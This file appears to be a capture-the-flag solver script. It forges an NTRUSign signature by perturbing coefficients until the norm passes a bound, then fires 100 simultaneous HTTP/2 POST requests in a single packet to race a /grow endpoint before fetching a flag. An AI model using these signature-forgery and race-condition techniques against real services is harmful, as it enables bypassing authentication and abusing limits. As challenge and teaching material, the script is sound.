import json
import sys
from pathlib import Path
import requests
from html.parser import HTMLParser
from h2spacex import H2Connection, H2OnTlsConnection
from h2spacex import h2_frames
import time
from ast import literal_eval
sys.path.insert(0, str(Path(__file__).parent / 'app'))
from NTRUSign import NTRU, KeyGenerator, Polynomial

DOMAIN = sys.argv[1]
DOMAIN_WITH_PORT = DOMAIN
TLS = False
if len(sys.argv) > 2:
    TLS = True

if TLS:
    PREFIX = 'https'
else:
    PREFIX = 'http'
    DOMAIN_WITH_PORT = DOMAIN + ":8001"


def get_response_of_sent_requests(frame_parser: h2_frames.FrameParser):
    responses = []
    for s_id in frame_parser.headers_and_data_frames.keys():
        headers = frame_parser.headers_and_data_frames[s_id]['header']
        data = frame_parser.headers_and_data_frames[s_id]['data']
        if 'content-encoding: gzip' in headers:
            data = h2_frames.decompress_gzip_data(data)
        elif 'content-encoding: br' in headers:
            data = h2_frames.decompress_br_data(data)
        elif 'content-encoding: deflate' in headers:
            data = h2_frames.decompress_deflate_data(data)

        responses.append(str(data))

    return responses

def run_spa(signature: str, count: int) -> bool:
    
    if TLS:
        h2_conn = H2OnTlsConnection(
            hostname=DOMAIN,
            port_number=443
        )
        h2_conn.setup_connection()
    else:
        h2_conn = H2Connection(
            hostname=DOMAIN,
            port_number=8001
        )
        h2_conn._create_raw_socket()
        h2_conn._send_h2_connection_preface()  # send HTTP/2 Connection Preface
        h2_conn._send_client_initial_settings_frame()  # send client initial settings frame to server

    stream_ids = h2_conn.generate_stream_ids(number_of_streams=100)

    all_headers_frames = []
    all_data_frames = []

    headers = f'Content-Type: application/json'

    # Generate payloads (header frames and last frames)
    for stream_id in stream_ids:

        header_frames, data_frame = h2_conn.create_single_packet_http2_post_request_frames(
            method='POST',
            headers_string=headers,
            scheme=PREFIX,
            stream_id=stream_id,
            authority=DOMAIN_WITH_PORT,
            body=json.dumps({"count": count, "sig": signature}),
            path='/grow'
        )

        all_headers_frames.append(header_frames)
        all_data_frames.append(data_frame)

    # Send frames except the last frames
    temp_headers_bytes = b''.join(bytes(h) for h in all_headers_frames)
    h2_conn.send_frames(temp_headers_bytes)

    # Sleep to let server process first part of attack, then ping to make sure server is alive
    time.sleep(0.1)
    h2_conn.send_ping_frame()

    # Send "last frames" in one packet
    temp_data_bytes = b''.join(bytes(d) for d in all_data_frames)
    h2_conn.send_frames(temp_data_bytes)

    resp = h2_conn.read_response_from_socket(_timeout=600)
    frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
    frame_parser.add_frames(resp)

    frame_parser.show_response_of_sent_requests()

    h2_conn.close_connection()
            

N_BOUND = 545

r = requests.get(f'{PREFIX}://{DOMAIN_WITH_PORT}/zero-signature')
r.raise_for_status()

current_signature = r.json()["signature"]
for i in range(3):
    r = requests.post(f'{PREFIX}://{DOMAIN_WITH_PORT}/grow', json={"count": i, "sig": current_signature})
    r.raise_for_status()
    current_signature = r.json()['signature']

r, s = NTRU.import_signature(current_signature)

res = requests.get(f'{PREFIX}://{DOMAIN_WITH_PORT}/public-key')
res.raise_for_status()
public_key = res.json()["public-key"]
# Convert to polynomial
NTRUKeys = KeyGenerator.KeyPair(B=1)
NTRUKeys.import_pub(public_key)

good_sig = None
N_bound = 545

# we only have access to r and s
for i in range(251):
    sprime = s + Polynomial.Polynomial(gen=True,N=251,o=i)
    sprime2 = s - Polynomial.Polynomial(gen=True,N=251,o=i)
    new_sig = NTRU.export_signature(r,sprime,N_BOUND,False)
    new_sig2 = NTRU.export_signature(r,sprime2,N_BOUND,False)

    m = NTRU.H(b'\x03'+r.to_bytes(10, 'big'), NTRUKeys.N)
    b = NTRU.NTRUNorm(sprime, sprime.star_multiply(NTRUKeys.pub) - m, (0, NTRUKeys.q))
    test_b = NTRU.NTRUNorm(s, s.star_multiply(NTRUKeys.pub) - m, (0, NTRUKeys.q))
    print(b, test_b)
    if b < N_bound:
        good_sig = new_sig
        break
    m = NTRU.H(b'\x03'+r.to_bytes(10, 'big'), NTRUKeys.N)
    b = NTRU.NTRUNorm(sprime2, sprime2.star_multiply(NTRUKeys.pub) - m, (0, NTRUKeys.q))
    print(b, test_b)
    if b < N_bound:
        good_sig = new_sig2
        break

print("Found valid signature")
print(good_sig)
run_spa(good_sig, 3)
print(i)

res = requests.post(f'{PREFIX}://{DOMAIN_WITH_PORT}/flag')
res.raise_for_status()
print(res.json()["msg"])